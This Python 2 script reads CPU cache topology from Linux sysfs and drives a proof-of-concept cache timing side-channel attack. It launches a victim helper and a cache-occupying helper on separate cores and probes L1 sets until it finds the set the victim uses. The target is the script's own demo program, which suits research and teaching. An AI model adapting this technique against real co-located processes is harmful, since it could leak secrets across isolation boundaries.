__author__ = 'machiry'
import os
import glob
import subprocess
from collections import defaultdict

MAIN_CPU_INFO_DIR = '/sys/devices/system/cpu'


class CacheInfo:
    def __init__(self):
        self.level = None
        self.size = None
        self.common_threads = None
        self.common_cores = None
        self.common_processors = None
        self.type = None
        self.line_size = None
        self.associativity = None
        self.sets = None

    def __str__(self):
        return 'Level:' + str(self.level) + '\n' + \
               'Size:' + str(self.size) + '\n' + \
               'Type:' + str(self.type) + '\n' + \
               'Line Size:' + str(self.line_size) + ' Bytes' + '\n' + \
               'Sets:' + str(self.sets) + '\n' + \
               'Associativity:' + str(self.associativity) + '\n' + \
               'Common Core Threads:' + str(self.common_threads) + '\n' + \
               'Common Cores:' + str(self.common_cores) + '\n' + \
               'Common Processors:' + str(self.common_processors) + '\n'


def get_cpu_thread_dirs():
    to_ret = []
    prev_work_dir = os.getcwd()
    os.chdir(MAIN_CPU_INFO_DIR)
    for core_name in glob.glob('cpu[0-9]*'):
        to_ret.append(os.path.join(MAIN_CPU_INFO_DIR, core_name))
    os.chdir(prev_work_dir)
    return to_ret


def file_read_lines(file_path):
    return [line.strip() for line in open(file_path)]


def get_shared_cpu_threads(cache_index_dir):
    """

    :rtype : list
    """
    shared_cpu = file_read_lines(os.path.join(cache_index_dir, 'shared_cpu_list'))[0]

    common_cpu_threads = []
    if ',' in shared_cpu:
        common_cpu_threads = shared_cpu.split(',')
    elif '-' in shared_cpu:
        start_no = int(shared_cpu.split('-')[0])
        end_no = int(shared_cpu.split('-')[1])
        while start_no <= end_no:
            common_cpu_threads.append(str(start_no))
            start_no += 1
    else:
        common_cpu_threads.append(shared_cpu)

    return common_cpu_threads


def get_common_core_processor_info(core_thread_list):
    common_cores = []
    common_processors = []
    for curr_cpu_thr in core_thread_list:
        topology_dir = os.path.join(os.path.join(MAIN_CPU_INFO_DIR, 'cpu' + curr_cpu_thr), 'topology')
        core_id = file_read_lines(os.path.join(topology_dir, 'core_id'))[0]
        if core_id not in common_cores:
            common_cores.append(core_id)
        processor_id = file_read_lines(os.path.join(topology_dir, 'physical_package_id'))[0]
        if processor_id not in common_processors:
            common_processors.append(processor_id)
    return common_cores, common_processors


def get_complete_cache_info():
    to_ret = []
    already_processed = []
    for curr_cpu_thread in get_cpu_thread_dirs():
        cache_info_dir = os.path.join(curr_cpu_thread, 'cache')
        i = 0
        curr_cache_index_dir = os.path.join(cache_info_dir, "index" + str(i))
        while os.path.exists(curr_cache_index_dir):
            # If cache level is not processed
            if curr_cache_index_dir not in already_processed:
                curr_cache_info = CacheInfo()
                # Get Shared CPU Threads
                common_cpu_threads = get_shared_cpu_threads(curr_cache_index_dir)
                for curr_thread_id in common_cpu_threads:
                    cpu_dir_ind = curr_cpu_thread.rfind('cpu')
                    to_ignore_index = os.path.join(
                        os.path.join(curr_cpu_thread[:cpu_dir_ind] + 'cpu' + curr_thread_id, 'cache'), 'index' + str(i))
                    already_processed.append(to_ignore_index)

                curr_cache_info.common_threads = common_cpu_threads
                curr_cache_info.type = file_read_lines(os.path.join(curr_cache_index_dir, 'type'))[0]
                curr_cache_info.size = file_read_lines(os.path.join(curr_cache_index_dir, 'size'))[0]
                curr_cache_info.sets = file_read_lines(os.path.join(curr_cache_index_dir, 'number_of_sets'))[0]
                curr_cache_info.associativity = \
                    file_read_lines(os.path.join(curr_cache_index_dir, 'ways_of_associativity'))[0]
                curr_cache_info.type = file_read_lines(os.path.join(curr_cache_index_dir, 'type'))[0]
                curr_cache_info.level = file_read_lines(os.path.join(curr_cache_index_dir, 'level'))[0]
                curr_cache_info.line_size = file_read_lines(os.path.join(curr_cache_index_dir, 'coherency_line_size'))[
                    0]
                (curr_cache_info.common_cores, curr_cache_info.common_processors) = get_common_core_processor_info(
                    curr_cache_info.common_threads)
                to_ret.append(curr_cache_info)
            i += 1
            curr_cache_index_dir = os.path.join(cache_info_dir, "index" + str(i))
    return to_ret

def read_proc_lines(min_time, read_fd, no_lines=10):
    no_of_lines = 0
    to_ret = []
    while True:
        curr_line = read_fd.readline()
        curr_line = curr_line.strip()
        #print 'dsadsa' + curr_line
        parts = curr_line.split(':')
        #print parts
        try:
            timestamp = int(parts[0])
            if timestamp > min_time:
                to_ret.append(parts[1].strip())
                no_of_lines += 1
        except Exception:
            pass
        if no_of_lines >= no_lines:
            break
    return to_ret

def get_no_entries_above_threshold(entries, threshold):
    to_ret = 0
    for curr_en in entries:
        if int(curr_en) >= int(threshold):
            to_ret += 1
    return to_ret

cache_info = get_complete_cache_info()
level_info = defaultdict(list)
for curr_info in cache_info:
    level_info[curr_info.level].append(curr_info)

# Invoke cache_timing, this will randomly pick a cache set and prints it.
args = ['taskset', '0x01', './cache_timing', str(level_info['1'][0].line_size), str(level_info['1'][0].sets)]
threshold_timing = 10
threshold_num = 7
p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=0)
victim_fd = p.stdout
target_set = victim_fd.readline().split(':')[1]
print '[+] Selected Set:'+ str(target_set)
print '[+] Trying to Predict Set.'
found = False
for i in range(0,int(level_info['1'][0].sets)):
    print '[+] Trying Set '+str(i)
    args = ['taskset', '0x10', './occupy_ca', str(level_info['1'][0].line_size), str(level_info['1'][0].sets),
            str(level_info['1'][0].associativity), str(i)]
    #print str(args)
    occupy_pd = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=0)
    after_time = occupy_pd.stdout.readline().split(':')[1]
    target_timings = read_proc_lines(int(after_time), victim_fd)
    target_no_entries = get_no_entries_above_threshold(target_timings, threshold_timing)
    occupy_pd.kill()
    #print target_timings
    if(target_no_entries > threshold_num):
        print '[+] Set '+ str(i)+ ' seems to the target set'
        found = True
        break
    else:
        print '[-] Set '+str(i)+ ' doesn\'t satisfy threshold constraints'
if found:
    print '[+] Cache timing attack successful'
else:
    print '[-] Cache timing attack failed'
p.kill()

